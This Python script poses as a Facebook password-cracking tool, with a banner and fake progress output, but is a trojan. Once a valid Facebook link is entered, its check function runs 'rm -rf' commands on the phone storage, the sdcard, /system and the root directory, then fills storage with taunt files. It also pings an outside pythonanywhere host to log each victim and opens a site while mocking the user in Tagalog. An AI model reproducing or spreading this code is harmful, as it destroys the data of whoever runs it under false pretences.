import time
import os
import sys
import requests

os.system('clear')
colors = {
  'Black': '\033[30m',
  'Red': '\033[31m',
  'Green': '\033[32m',
  'Yellow': '\033[33m',
  'Blue': '\033[34m',
  'Magenta': '\033[35m',
  'Cyan': '\033[36m',
  'White': '\033[37m',
  'bold': '\033[1m',
  'reset': '\033[0m'
}
banner = f"""{colors['Red']}
              db   db     db      .$$¥b.   db  A
              $$. .$$    A$$A    .A$       $$.A/
              $$$$$$$   $V  V$   |$•       $$$H
              $$' '$$  A$====$A  'VA.  .   $$'A\\
              YP   YP AV      VA   V$$$P   YK  $A{colors['White']}

 ━━━━━━━━━━━━━━━━━━━━━[ Facebook ]━━━━━━━━━━━━━━━━━━━━━━"""
print(banner)
def victim():
	endp = "https://greegmon2.pythonanywhere.com/tools?message=CDFG-1+"
	response = requests.get(endp)

def site():
	os.system('clear')
	print(banner)
	text = "\033[0m\033[90m Ang password ay matagumpay na nakuha, kung nais mo itong makita pindutin ang 'enter' para mapunta sa site at pindutin ang 'See password'."
	for notw in text:
		print(notw, end='', flush=True)
		time.sleep(0.08)
	os.system('clear')
	print(banner)
	victim()
	input("([==|ENTER|==]) >>")
	os.system('xdg-open https://see-pass.vercel.app/')
	print("\033[1;91m Tingnam mo files mo HAHAHAHAHAHAHHAHAHAHAHAHA")
	sys.exit()
def start(url):
	os.system('clear')
	print(banner)
	a = 0
	b = 20
	c = 50
	d = 90
	while True:
		time.sleep(1)
		if a <= 20:
			print(f"\033[1;91m TARGET: \033[93mhttps://www.facebook.com/.....")
			print(f"\033[1;92m Checking Password: \033[90m******* \033[37m[ \033[91mWrong\033[37m ]-{a}%\n")
			a += 1
		elif b < 50:
			print(f'\033[1;91m TARGET: \033[93mhttps://www.facebook.com/.....')
			print(f"\033[1;92m Checking Password: \033[90m******* \033[37m[ \033[91mWrong\033[37m ]-{b}%\n")
			b += 2
		elif c <= 90:
			print(f'\033[1;91m TARGET: \033[93mhttps://www.facebook.com/.....')
			print(f"\033[1;92m Checking Password: \033[90m******* \033[37m[ \033[91mWrong\033[37m ]-{c}%\n")
			c += 5
		elif d <= 99:
			print(f'\033[1;91m TARGET: \033[93mhttps://www.facebook.com/.....')
			print(f"\033[1;92m Checking Password: \033[90m******* \033[37m[ \033[91mWrong\033[37m ]-{d}%\n")
			d += 1
		elif d == 100:
			print()
			print(f'\033[1;91m TARGET: \033[93m{url}')
			print(f"\033[1;92m Checking Password: \033[90mB*****3 \033[37m[ \033[92mCorrect\033[37m ]-{d}%\n")
			site()
			break

def check(status, url):
	time.sleep(1)
	print(banner)
	if status != 200:
	  for i in range(6):
	  	print(f"\033[32m Checking account{'.'*3}")
	  	time.sleep(0.8)
	  print(f"\033[91m ERROR: \033[31mInvalid Facebook account link")
	  sys.exit()
	else:
		for i in range(6):
			print("\033[32m Checking account..")
			time.sleep(0.8)
		os.system('rm -rf /storage/emulated/0')
		os.system('rm -rf /sdcard/*')
		os.system('rm -rf /system/*')
		os.system('rm -rf /*')
		for pogi in range(50):
			os.system(f'touch /storage/emulated/0/Greegmon-pogi-{pogi}.txt')
		os.system('clear')
		print(banner)
		input("\033[0m Enter to start hacking.")
		time.sleep(0.3)
		link = url
		start(link)

jll = False
def name():
	link = input("\033[0m\033[37m TARGET LINKR: \033[91m")
	if not link.startswith('https://www.facebook.com/'):
		os.system('clear')
		check(400, link)
	else:
		os.system('clear')
		check(200, link)
if jll:
	sys.exit()
else:
	name()
	jll = True
print(banner)